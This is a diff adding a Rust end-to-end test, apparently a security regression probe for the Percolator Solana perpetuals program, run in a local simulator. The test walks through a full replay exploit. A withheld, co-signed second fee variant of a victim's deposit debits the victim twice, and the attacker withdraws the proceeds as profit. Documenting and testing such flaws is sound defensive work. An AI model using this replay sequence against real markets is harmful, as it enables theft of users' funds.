@@ -24,6 +24,430 @@ fn twap_id() -> Pubkey {
     twap_program::id()
 }
 
+// PUBLIC LOF PROBE: a portfolio deposit is additive, but the signed wire carries
+// only an amount. Two fee variants signed for one intended rescue deposit must
+// not both debit the owner after the first variant mutates the portfolio.
+#[test]
+#[ignore = "expected RED until the pinned Percolator deposit wire is sequenced"]
+fn e2e_presigned_portfolio_deposit_retry_cannot_fund_counterparty_profit_twice() {
+    use percolator_prog::ix::Instruction as PIx;
+
+    const INITIAL_PRICE: u64 = 100;
+    const INITIAL_DEPOSIT: u64 = 100;
+    const RESCUE_DEPOSIT: u64 = 100;
+    const SIZE_Q: i128 = percolator::POS_SCALE as i128;
+
+    let mut svm =
+        LiteSVM::new().with_compute_budget(solana_program_runtime::compute_budget::ComputeBudget {
+            compute_unit_limit: 1_400_000,
+            heap_size: 256 * 1024,
+            ..solana_program_runtime::compute_budget::ComputeBudget::default()
+        });
+    svm.add_program_from_file(perc_id(), perc_so()).unwrap();
+
+    let payer = Keypair::new();
+    let admin = Keypair::new();
+    let oracle = Keypair::new();
+    let attacker = Keypair::new();
+    let victim = Keypair::new();
+    svm.airdrop(&payer.pubkey(), 100_000_000_000).unwrap();
+    svm.airdrop(&admin.pubkey(), 1_000_000_000).unwrap();
+    svm.airdrop(&oracle.pubkey(), 1_000_000_000).unwrap();
+    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();
+    svm.set_sysvar(&Clock {
+        slot: 100,
+        unix_timestamp: 100,
+        ..Clock::default()
+    });
+
+    let mint_authority = Keypair::new();
+    let collateral_mint = create_real_mint(&mut svm, &payer, &mint_authority.pubkey());
+    let market = Keypair::new();
+    let market_len = percolator_prog::state::market_account_len_for_capacity(1).unwrap();
+    let market_rent = svm.minimum_balance_for_rent_exemption(market_len);
+    send(
+        &mut svm,
+        &[&payer, &market],
+        solana_sdk::system_instruction::create_account(
+            &payer.pubkey(),
+            &market.pubkey(),
+            market_rent,
+            market_len as u64,
+            &perc_id(),
+        ),
+    )
+    .expect("public creator allocates the market");
+    let market = market.pubkey();
+    send(
+        &mut svm,
+        &[&payer, &admin],
+        pix(
+            vec![
+                AccountMeta::new_readonly(admin.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new_readonly(collateral_mint, false),
+            ],
+            PIx::InitMarket {
+                max_portfolio_assets: 1,
+                h_min: 0,
+                h_max: 10,
+                initial_price: INITIAL_PRICE,
+                min_nonzero_mm_req: 1,
+                min_nonzero_im_req: 2,
+                maintenance_margin_bps: 10_000,
+                initial_margin_bps: 10_000,
+                max_trading_fee_bps: 10_000,
+                trade_fee_base_bps: 0,
+                liquidation_fee_bps: 0,
+                liquidation_fee_cap: 0,
+                min_liquidation_abs: 0,
+                max_price_move_bps_per_slot: 10_000,
+                max_accrual_dt_slots: 1,
+                max_abs_funding_e9_per_slot: 0,
+                min_funding_lifetime_slots: 1,
+                max_account_b_settlement_chunks: 1,
+                max_bankrupt_close_chunks: 1,
+                max_bankrupt_close_lifetime_slots: 100,
+                public_b_chunk_atoms: percolator::MAX_VAULT_TVL,
+                maintenance_fee_per_slot: 0,
+            },
+        ),
+    )
+    .expect("public creator initializes a normal market");
+    send(
+        &mut svm,
+        &[&payer, &admin, &oracle],
+        pix(
+            vec![
+                AccountMeta::new_readonly(admin.pubkey(), true),
+                AccountMeta::new_readonly(oracle.pubkey(), true),
+                AccountMeta::new(market, false),
+            ],
+            PIx::UpdateAssetAuthority {
+                asset_index: 0,
+                kind: 4,
+                new_pubkey: oracle.pubkey().to_bytes(),
+            },
+        ),
+    )
+    .expect("creator assigns an independent oracle");
+    send(
+        &mut svm,
+        &[&payer, &oracle],
+        pix(
+            vec![
+                AccountMeta::new_readonly(oracle.pubkey(), true),
+                AccountMeta::new(market, false),
+            ],
+            PIx::ConfigureAuthMark {
+                asset_index: 0,
+                now_slot: 100,
+                initial_mark_e6: INITIAL_PRICE,
+            },
+        ),
+    )
+    .expect("independent oracle configures the mark");
+
+    let vault_authority = perc_vault_authority(&market, &perc_id());
+    let vault = canonical_insurance_vault(&vault_authority, &collateral_mint);
+    set_token(&mut svm, &vault, &collateral_mint, &vault_authority, 0);
+    let attacker_source = Pubkey::new_unique();
+    let victim_source = Pubkey::new_unique();
+    set_token(
+        &mut svm,
+        &attacker_source,
+        &collateral_mint,
+        &attacker.pubkey(),
+        INITIAL_DEPOSIT,
+    );
+    set_token(
+        &mut svm,
+        &victim_source,
+        &collateral_mint,
+        &victim.pubkey(),
+        INITIAL_DEPOSIT + 2 * RESCUE_DEPOSIT,
+    );
+
+    let attacker_portfolio = Keypair::new();
+    let victim_portfolio = Keypair::new();
+    let portfolio_len =
+        percolator_prog::state::portfolio_account_len_for_market_slots(1).unwrap();
+    let portfolio_rent = svm.minimum_balance_for_rent_exemption(portfolio_len);
+    for (owner, portfolio) in [
+        (&attacker, &attacker_portfolio),
+        (&victim, &victim_portfolio),
+    ] {
+        send(
+            &mut svm,
+            &[&payer, portfolio],
+            solana_sdk::system_instruction::create_account(
+                &payer.pubkey(),
+                &portfolio.pubkey(),
+                portfolio_rent,
+                portfolio_len as u64,
+                &perc_id(),
+            ),
+        )
+        .expect("public user allocates a portfolio");
+        send(
+            &mut svm,
+            &[&payer, owner],
+            pix(
+                vec![
+                    AccountMeta::new_readonly(owner.pubkey(), true),
+                    AccountMeta::new(market, false),
+                    AccountMeta::new(portfolio.pubkey(), false),
+                ],
+                PIx::InitPortfolio,
+            ),
+        )
+        .expect("public user initializes a portfolio");
+    }
+
+    for (owner, portfolio, source) in [
+        (&attacker, &attacker_portfolio, attacker_source),
+        (&victim, &victim_portfolio, victim_source),
+    ] {
+        send(
+            &mut svm,
+            &[&payer, owner],
+            pix(
+                vec![
+                    AccountMeta::new(owner.pubkey(), true),
+                    AccountMeta::new(market, false),
+                    AccountMeta::new(portfolio.pubkey(), false),
+                    AccountMeta::new(source, false),
+                    AccountMeta::new(vault, false),
+                    AccountMeta::new_readonly(spl_token::ID, false),
+                ],
+                PIx::Deposit {
+                    amount: INITIAL_DEPOSIT as u128,
+                },
+            ),
+        )
+        .expect("public user deposits initial collateral");
+    }
+    send(
+        &mut svm,
+        &[&payer, &attacker, &victim],
+        pix(
+            vec![
+                AccountMeta::new(attacker.pubkey(), true),
+                AccountMeta::new(victim.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(attacker_portfolio.pubkey(), false),
+                AccountMeta::new(victim_portfolio.pubkey(), false),
+            ],
+            PIx::TradeNoCpi {
+                asset_index: 0,
+                size_q: SIZE_Q,
+                exec_price: INITIAL_PRICE,
+                fee_bps: 0,
+            },
+        ),
+    )
+    .expect("attacker opens long against the victim short");
+
+    let rescue = pix(
+        vec![
+            AccountMeta::new(victim.pubkey(), true),
+            AccountMeta::new(market, false),
+            AccountMeta::new(victim_portfolio.pubkey(), false),
+            AccountMeta::new(victim_source, false),
+            AccountMeta::new(vault, false),
+            AccountMeta::new_readonly(spl_token::ID, false),
+        ],
+        PIx::Deposit {
+            amount: RESCUE_DEPOSIT as u128,
+        },
+    );
+    svm.expire_blockhash();
+    let replay_blockhash = svm.latest_blockhash();
+    let first_variant = Transaction::new_signed_with_payer(
+        &[
+            solana_sdk::compute_budget::ComputeBudgetInstruction::set_compute_unit_price(1),
+            rescue.clone(),
+        ],
+        Some(&attacker.pubkey()),
+        &[&attacker, &victim],
+        replay_blockhash,
+    );
+    let withheld_variant = Transaction::new_signed_with_payer(
+        &[
+            solana_sdk::compute_budget::ComputeBudgetInstruction::set_compute_unit_price(2),
+            rescue,
+        ],
+        Some(&attacker.pubkey()),
+        &[&attacker, &victim],
+        replay_blockhash,
+    );
+    svm.send_transaction(first_variant)
+        .expect("the intended rescue deposit lands");
+    assert_eq!(token_amount(&svm, &victim_source), RESCUE_DEPOSIT);
+    let state_after_first = (
+        svm.get_account(&market).unwrap(),
+        svm.get_account(&victim_portfolio.pubkey()).unwrap(),
+        svm.get_account(&victim_source).unwrap(),
+        svm.get_account(&vault).unwrap(),
+    );
+    if svm.send_transaction(withheld_variant).is_err() {
+        assert_eq!(svm.get_account(&market).unwrap(), state_after_first.0);
+        assert_eq!(
+            svm.get_account(&victim_portfolio.pubkey()).unwrap(),
+            state_after_first.1
+        );
+        assert_eq!(svm.get_account(&victim_source).unwrap(), state_after_first.2);
+        assert_eq!(svm.get_account(&vault).unwrap(), state_after_first.3);
+        return;
+    }
+    assert_eq!(
+        token_amount(&svm, &victim_source),
+        0,
+        "the withheld fee variant debits the victim a second time"
+    );
+
+    let push_mark = |svm: &mut LiteSVM, slot: u64, mark_e6: u64| {
+        svm.set_sysvar(&Clock {
+            slot,
+            unix_timestamp: slot as i64,
+            ..Clock::default()
+        });
+        send(
+            svm,
+            &[&payer, &oracle],
+            pix(
+                vec![
+                    AccountMeta::new_readonly(oracle.pubkey(), true),
+                    AccountMeta::new(market, false),
+                ],
+                PIx::PushAuthMark {
+                    asset_index: 0,
+                    now_slot: slot,
+                    mark_e6,
+                },
+            ),
+        )
+    };
+    let crank = |svm: &mut LiteSVM, portfolio: Pubkey, slot: u64| {
+        send(
+            svm,
+            &[&payer],
+            pix(
+                vec![
+                    AccountMeta::new(payer.pubkey(), true),
+                    AccountMeta::new(market, false),
+                    AccountMeta::new(portfolio, false),
+                ],
+                PIx::PermissionlessCrank {
+                    now_slot: slot,
+                    observations: vec![percolator_prog::ix::CrankObservationHint {
+                        asset_index: 0,
+                        oracle_accounts: 0,
+                    }],
+                },
+            ),
+        )
+    };
+
+    push_mark(&mut svm, 101, 200).expect("independent oracle doubles the mark");
+    crank(&mut svm, attacker_portfolio.pubkey(), 101).expect("winner settles first mark");
+    crank(&mut svm, victim_portfolio.pubkey(), 101).expect("victim pays first mark");
+    push_mark(&mut svm, 102, 400).expect("independent oracle doubles the mark again");
+    crank(&mut svm, attacker_portfolio.pubkey(), 102).expect("winner settles final mark");
+    send(
+        &mut svm,
+        &[&payer, &attacker, &victim],
+        pix(
+            vec![
+                AccountMeta::new(attacker.pubkey(), true),
+                AccountMeta::new(victim.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(attacker_portfolio.pubkey(), false),
+                AccountMeta::new(victim_portfolio.pubkey(), false),
+            ],
+            PIx::TradeNoCpi {
+                asset_index: 0,
+                size_q: -SIZE_Q,
+                exec_price: 400,
+                fee_bps: 0,
+            },
+        ),
+    )
+    .expect("both owners flatten after the independent mark");
+    crank(&mut svm, attacker_portfolio.pubkey(), 102).expect("winner settles flat state");
+    crank(&mut svm, victim_portfolio.pubkey(), 102).expect("victim settles flat state");
+    send(
+        &mut svm,
+        &[&payer, &attacker],
+        pix(
+            vec![
+                AccountMeta::new(attacker.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(attacker_portfolio.pubkey(), false),
+            ],
+            PIx::ConvertReleasedPnl { amount: u128::MAX },
+        ),
+    )
+    .expect("attacker converts the victim-funded profit");
+    let attacker_capital = percolator_prog::state::read_portfolio(
+        &svm
+            .get_account(&attacker_portfolio.pubkey())
+            .unwrap()
+            .data,
+    )
+    .unwrap()
+    .capital
+    .get();
+    assert_eq!(
+        attacker_capital, 400,
+        "the replayed 100-atom rescue became attacker-extractable profit"
+    );
+
+    let attacker_destination = Pubkey::new_unique();
+    set_token(
+        &mut svm,
+        &attacker_destination,
+        &collateral_mint,
+        &attacker.pubkey(),
+        0,
+    );
+    send(
+        &mut svm,
+        &[&payer, &attacker],
+        pix(
+            vec![
+                AccountMeta::new(attacker.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(attacker_portfolio.pubkey(), false),
+                AccountMeta::new(attacker_destination, false),
+                AccountMeta::new(vault, false),
+                AccountMeta::new_readonly(vault_authority, false),
+                AccountMeta::new_readonly(spl_token::ID, false),
+            ],
+            PIx::Withdraw {
+                amount: attacker_capital,
+            },
+        ),
+    )
+    .expect("attacker withdraws the replay-funded profit");
+    assert_eq!(token_amount(&svm, &attacker_destination), 400);
+    let victim_capital = percolator_prog::state::read_portfolio(
+        &svm
+            .get_account(&victim_portfolio.pubkey())
+            .unwrap()
+            .data,
+    )
+    .unwrap()
+    .capital
+    .get();
+    assert_eq!(victim_capital, 0);
+    assert_eq!(token_amount(&svm, &victim_source), 0);
+    assert_eq!(token_amount(&svm, &vault), 0);
+    panic!(
+        "withheld deposit variant extracted 100 extra atoms from an independent victim"
+    );
+}
+
 #[derive(Clone, Copy, Eq, PartialEq)]
 enum PoolRestartScenario {
     NoRestartAfterLoss,
